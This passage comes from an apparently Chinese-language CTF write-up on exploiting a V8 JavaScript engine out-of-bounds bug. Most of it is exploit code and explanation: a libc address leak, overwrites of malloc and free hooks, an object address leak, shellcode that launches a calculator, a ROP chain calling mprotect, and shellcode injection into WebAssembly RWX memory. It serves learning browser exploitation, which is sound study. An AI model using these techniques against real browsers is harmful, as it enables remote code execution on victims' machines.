<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*泄露libc地址*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> heap=wr.leak()-<span class="number">0x10</span>;	</span><br><span class="line">chunk=heap;							<span class="comment">//以backing store指针-0x10作为初始化chunk</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]leak backing store address=&quot;</span>+hex(heap));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> size=wr.read(chunk+<span class="number">8</span>);</span><br><span class="line">size=<span class="built_in">parseInt</span>(size/<span class="number">8</span>)*<span class="number">8</span>;</span><br><span class="line"><span class="keyword">let</span> finded=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//循环以chunk为单位遍历</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x3000</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//let leak=wr.read(heap);</span></span><br><span class="line">	prev_size=wr.read(chunk);</span><br><span class="line">	size=wr.read(chunk+<span class="number">8</span>);</span><br><span class="line">	</span><br><span class="line">  <span class="comment">//筛选条件：</span></span><br><span class="line">  <span class="comment">//size！==0，必须为chunk结构</span></span><br><span class="line">  <span class="comment">//size%2===0,上一个chunk必须被free(prev inuse=0)</span></span><br><span class="line">  <span class="comment">//prev_size &lt;=0x3f0 </span></span><br><span class="line">	<span class="keyword">if</span>(size !== <span class="number">0</span> &amp;&amp; size % <span class="number">2</span> === <span class="number">0</span> &amp;&amp; prev_size &lt;= <span class="number">0x3f0</span>) </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">let</span> tmp_ptr=chunk-prev_size;</span><br><span class="line">		<span class="comment">//%SystemBreak() </span></span><br><span class="line">		fd=wr.read(tmp_ptr+<span class="number">0x10</span>);</span><br><span class="line">		bk=wr.read(tmp_ptr+<span class="number">0x18</span>);</span><br><span class="line">		<span class="comment">//console.log(hex(chunk)+&quot;-&gt;&quot;+hex(prev_size));</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">parseInt</span>(fd/<span class="number">0x10000000000</span>)===<span class="number">0x7f</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]leak unsort bin(fd)&quot;</span>);</span><br><span class="line">		finded=fd;</span><br><span class="line">		<span class="keyword">break</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">parseInt</span>(bk/<span class="number">0x10000000000</span>)===<span class="number">0x7f</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]leak unsort bin(bk)&quot;</span>);</span><br><span class="line">		<span class="built_in">console</span>.log(hex(bk));</span><br><span class="line">		<span class="keyword">break</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(size&lt;<span class="number">0x20</span>)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">	</span><br><span class="line">	size=<span class="built_in">parseInt</span>(size/<span class="number">8</span>)*<span class="number">8</span>;  <span class="comment">//size要抹掉最后的3bit</span></span><br><span class="line">	chunk+=size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(finded!==<span class="number">0</span>)</span><br><span class="line">&#123;	</span><br><span class="line">	libc_base=finded-<span class="number">0x3c3bb8</span>;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&quot;libc_base=&quot;</span>+hex(libc_base));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&quot;Error when leak libc base!Try Again.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果是pwn题，修改malloc_hook为one_gadget就很简单了，可以弹个本地shell（并没有实际作用。。）。这可是浏览器题，至少也要执行一下shellcode，弹个计算器吧。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*malloc_hook*/</span></span><br><span class="line">malloc_hook=<span class="number">0x3C3B10</span>+libc_base;</span><br><span class="line">one_gadget=<span class="number">0xf0897</span>+libc_base;</span><br><span class="line">wr.write(malloc_hook,one_gadget);</span><br></pre></td></tr></table></figure>
<p>发现一种用system弹calculator的方式，将free_hook替换为system，这样在释放binsh的时候就会执行system(“&#x2F;snap&#x2F;bin&#x2F;gnome-calculator)。Mark一下，不过这个也是pwn类型的利用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wr.write(libc_base + <span class="number">0x3C57A8</span>, libc_base + <span class="number">0x45380</span>); <span class="comment">// free hook</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> binsh = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x30</span>));</span><br><span class="line">cmd = [<span class="number">1634628399</span>, <span class="number">1768042352</span>, <span class="number">1852256110</span>, <span class="number">761621871</span>, <span class="number">1668047203</span>, <span class="number">1952541813</span>, <span class="number">29295</span>];</span><br><span class="line"><span class="comment">// &quot;/snap/bin/gnome-calculator&quot;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cmd.length; i++)</span><br><span class="line">    binsh[i] = cmd[i];</span><br></pre></td></tr></table></figure>
<br>

<p>一开始想看看能不能用Heap Spary+ROP来执行shellcode，v8的HeapSpray我一直找不到合适的喷射值，就暂时放一放。还是参考大师傅们的利用手法，在栈中写值来控制EIP。</p>
<p><em>布置shellcode和ROP</em></p>
<p>首先需要为ArbitraryRW增加一个leak功能，相当于实现了一个%DebugPrint。这样就能泄漏shellcode的地址。需要添加的代码如下。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">let oobArray = [1.1];  //float</span><br><span class="line">let arrays=[];	</span><br><span class="line"><span class="addition">+let objs=[];		//for leak							</span></span><br><span class="line">let maxSize = 1028 * 8;	</span><br><span class="line">					//8224	</span><br><span class="line">var a;		</span><br><span class="line">Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : _ =&gt; ( </span><br><span class="line">  &#123;</span><br><span class="line">    counter : 0,</span><br><span class="line">    next() &#123;</span><br><span class="line">      let result = 1.1;</span><br><span class="line">	this.counter++;</span><br><span class="line">      if (this.counter &gt; maxSize) &#123;	 	</span><br><span class="line">	 oobArray.length=1;	// !=0 void from be huishou by GC,Elements will point to a null pointer</span><br><span class="line">	for(let i=0;i&lt;100;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	    let array=new ArrayBuffer(0x512);</span><br><span class="line"><span class="addition">+	    let obj=&#123;&#x27;a&#x27;:0x1234,&#x27;b&#x27;:0x5678&#125;;</span></span><br><span class="line">	    arrays.push(array);</span><br><span class="line"><span class="addition">+	    objs.push(obj);</span></span><br><span class="line">	    //%DebugPrint(array);	</span><br><span class="line">	&#125;		</span><br><span class="line">        return &#123;done: true&#125;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return &#123;value: result, done: false&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="addition">+let obj_index;</span></span><br><span class="line"><span class="addition">+let obj_offset;</span></span><br><span class="line"><span class="addition">+//find Objects</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+for(let i=0;i&lt;maxSize;i++)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	let val=ct.f2i(oobArray[i]);</span></span><br><span class="line"><span class="addition">+	if(val===0x123400000000)</span></span><br><span class="line"><span class="addition">+	&#123;</span></span><br><span class="line"><span class="addition">+		obj_offset=i;</span></span><br><span class="line"><span class="addition">+		console.log(&quot;[*]find target objecets in oobArray number [&quot;+i+&quot;]&quot;);</span></span><br><span class="line"><span class="addition">+		oobArray[i]=ct.i2f(0x123500000000);</span></span><br><span class="line"><span class="addition">+		break;</span></span><br><span class="line"><span class="addition">+	&#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+for(let i=0;i&lt;100;i++)</span></span><br><span class="line"><span class="addition">+&#123;	</span></span><br><span class="line"><span class="addition">+	if(objs[i].a===0x1235)&#123;</span></span><br><span class="line"><span class="addition">+	   	console.log(&quot;[*]find target objs number [&quot;+i+&quot;]&quot;);</span></span><br><span class="line"><span class="addition">+		obj_index=i;</span></span><br><span class="line"><span class="addition">+		break;</span></span><br><span class="line"><span class="addition">+	&#125;	</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>
<p>制造一个可控对象obj，在通过oobArray泄露obj的属性a。要leak一个对象的地址，只需要将对象绑定到obj的a属性，然后oobArray泄露地址即可。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class ArbitraryRW</span><br><span class="line">&#123;</span><br><span class="line"><span class="addition">+	leak_obj(obj)&#123;</span></span><br><span class="line"><span class="addition">+		objs[obj_index].a = obj;		</span></span><br><span class="line"><span class="addition">+		return ct.f2i(oobArray[obj_offset]) - 1;</span></span><br><span class="line"><span class="addition">+	&#125;</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们就可以布置Shellcode和ROP链，通过ROP来调用mprotect将shellcode所在地址空间的属性改为RWX。至于如何控制程序流，就这个技巧之前也没接触过，就是向栈中写retn，希望在程序退栈的时候能踩到上面，然后一路retn到我们布置在高位的rop链。一开始想多覆盖一些retn，不过程序直接崩了，覆盖少量的反而成功率更高。</p>
<p>Stack的地址，我们可以通过libc中的全局变量environ来获得stack的一个高位指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r ~&#x2F;libc.so.6 |grep environ</span><br><span class="line">0000003c2df8  011b00000006 R_X86_64_GLOB_DAT 00000000003c5f98 _environ@@GLIBC_2.2.5 + 0</span><br><span class="line">0000003c2eb8  051100000006 R_X86_64_GLOB_DAT 00000000003c5f98 __environ@@GLIBC_2.2.5 + 0</span><br></pre></td></tr></table></figure>
<p>代码如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//PUSH SHELLCODE</span></span><br><span class="line"><span class="keyword">let</span> shellcode=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">4096</span>);</span><br><span class="line"><span class="keyword">let</span> shellcode_addr=wr.leak_obj(shellcode);</span><br><span class="line"></span><br><span class="line">ptr=wr.read(shellcode_addr+<span class="number">0x18</span>)-<span class="number">1</span>;		<span class="comment">//获取shellcode地址</span></span><br><span class="line">shellcode_addr=wr.read(ptr+<span class="number">0x20</span>);			<span class="comment">//TypeArray --&gt; ArrayBuffer</span></span><br><span class="line"><span class="built_in">console</span>.log(hex(shellcode_addr));</span><br><span class="line"><span class="keyword">let</span> sc=[<span class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];  <span class="comment">//弹出一个计算器</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;sc.length;i++)&#123;</span><br><span class="line">	shellcode[i]=sc[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ROP</span></span><br><span class="line"><span class="keyword">let</span> pop_rdi=<span class="number">0x21102</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rsi=<span class="number">0x202e8</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rdx=<span class="number">0x01b92</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> retn=<span class="number">0xe9bbb</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> mprotect=<span class="number">0x100eb0</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> rop=[</span><br><span class="line">pop_rdi,</span><br><span class="line"><span class="built_in">parseInt</span>(shellcode_addr/<span class="number">0x1000</span>)*<span class="number">0x1000</span>,</span><br><span class="line">pop_rsi,</span><br><span class="line"><span class="number">1024</span>,</span><br><span class="line">pop_rdx,</span><br><span class="line"><span class="number">7</span>,</span><br><span class="line">mprotect,</span><br><span class="line">shellcode_addr</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">//GET STACK_ADDR</span></span><br><span class="line"><span class="keyword">let</span> environ_addr=libc_base+<span class="number">0x3c5f98</span>;</span><br><span class="line"><span class="keyword">let</span> stack_addr=wr.read(environ_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]stack address &quot;</span>+hex(stack_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop_addr=stack_addr-<span class="number">200</span>*rop.length;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]rop address &quot;</span>+hex(rop_addr))</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;rop.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">	wr.write(rop_addr+i*<span class="number">8</span>,rop[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;<span class="number">100</span>;i++)		<span class="comment">//过多的覆盖反而会导致段错误，10～100都可以</span></span><br><span class="line">&#123;</span><br><span class="line">	wr.write(rop_addr-i*<span class="number">8</span>,retn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完整的利用见附录。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/5ufCKv.png" alt="5ufCKv"></p>
<p><em>写利用的时候碰到了很多看似玄学的东西，困扰了很久，为了彻底搞懂花费了不少时间。虽然最很多自己想出的解决方案也都没什么营养，但最终把问题搞明白也是一个非常煎熬也是非常有意思的过程。比如在泄漏libc地址的时候，成功泄漏了main_arena+152的地址，但是后来去内存里了一看，fd的位置的值是0x0。查了好几遍都没找到，实在是很玄学，直到我在泄露前下了一个断点，发现泄露当时这个fd是存在的，只不过后来又被malloc掉了。毕竟我们利用js泄露地址时，并没有控制EIP，所以背后的程序还是在跑，堆空间也总是在变化。</em></p>
<p><strong>Wasm执行shellcode</strong></p>
<p>Wasm是一种可以让JS执行机器码的技术，我们可以借助Wasm来写入自己的shellcode。</p>
<p>要生成Wasm，最方便的方案是直接用大神写好的生成网站，可以将我们的C语言生成为调用Wasm的JS代码。</p>
<p><a target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/">https://wasdk.github.io/WasmFiddle/</a></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/kWYsBe.png" alt="kWYsBe"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(wasmInstance.exports.main());</span><br></pre></td></tr></table></figure>
<p>将网站底部生成的wasmCode和右上角的JS代码结合，就能运行C编译出的字节码。当然这个C并不能进行系统调用，所以直接用C写shellcode自然是不行的。不过我们可以通过自己的任意地址写，将自己的shellcode写入Wasm的RWX内存区域（但是并不是Wasm的AST，具体的我也不是特别了解）。</p>
<p><em><strong>参考</strong></em></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html">从一道CTF题零基础学V8漏洞利用</a> </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f=wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">%DebugPrint(f);</span><br><span class="line"><span class="keyword">let</span> asm_addr=wr.leak_obj(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]address of asm = &quot;</span>+hex(asm_addr));</span><br><span class="line"><span class="keyword">let</span> sharedInfo =wr.read(asm_addr+<span class="number">0x18</span>)-<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> functionData=wr.read(sharedInfo+<span class="number">0x8</span>)-<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> instanceAddr=<span class="built_in">parseInt</span>(wr.read(functionData+<span class="number">0x70</span>)/<span class="number">0x10000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;functionData addresss =&quot;</span>+hex(functionData));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] RWX address =&quot;</span>+hex(instanceAddr));</span><br></pre></td></tr></table></figure>
<p>通过leak_obj函数将WASM的地址泄露，然后通过WASM的结构（在release下）一步步将RWX空间读取出来。需要注意的是根据不同版本的v8，数据结构可能不同 ，所以需要更具实际调试结果为准。此处的结构如下</p>
<p><em><strong>wasmInstance.exports.main f-&gt;shared_info-&gt;code+0x70</strong></em></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/nU6RUE.png" alt="nU6RUE"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/ldz5he.png" alt="ldz5he"></p>
<p>获取RWX地址，直接将shellcode写进去就行了。之后只需要调用这个WASM函数就可以执行我们的shellcode。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sc=[<span class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span 